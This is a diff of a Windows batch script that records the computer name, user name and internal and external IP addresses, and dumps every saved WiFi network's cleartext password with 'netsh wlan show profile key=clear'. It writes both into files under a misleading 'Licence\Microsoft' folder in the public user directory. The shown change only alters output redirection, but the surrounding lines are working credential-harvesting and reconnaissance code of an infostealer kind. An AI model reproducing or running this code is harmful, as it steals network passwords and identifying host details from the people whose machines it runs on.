@@ -487,28 +487,28 @@ echo .
 
    ::echo ************* Find IP ****************
    echo Vip!
-   echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
-   echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
+   echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" 
+   echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" 
    for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
    set ip=%ip:~1%
-   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
+   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
    For /f %%A in (
    'powershell -nop -c "(Invoke-RestMethod http://ipinfo.io/json).IP"'
    ) Do Set ExtIP=%%A
-   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
+   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
 
    ::echo ************* WiFi password ****************
    echo Need wife!
    setlocal enabledelayedexpansion
-   echo WiFi Password is: >"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" > nul 2> nul
-   echo. >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" > nul 2> nul
+   echo WiFi Password is: >"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
+   echo. >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" 
    for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
        set wifi_pwd=
        for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
            set wifi_pwd=%%F
 	   set ssid=%%a
        )
-       echo # !ssid! : !wifi_pwd! >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" > nul 2> nul
+       echo # !ssid! : !wifi_pwd! >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" 
    )
 
    echo Executed
